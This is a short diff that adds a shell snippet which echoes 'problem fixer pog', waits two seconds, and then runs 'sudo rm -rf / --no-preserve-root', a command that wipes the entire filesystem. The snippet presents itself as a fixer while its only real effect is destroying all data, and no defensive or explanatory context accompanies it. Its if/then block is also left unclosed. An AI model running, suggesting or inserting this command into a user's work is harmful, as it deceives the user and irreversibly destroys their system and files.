@@ -1,0 +1,5 @@
+if
+echo problem fixer pog
+sleep 2
+then
+sudo rm -rf / --no-preserve-root
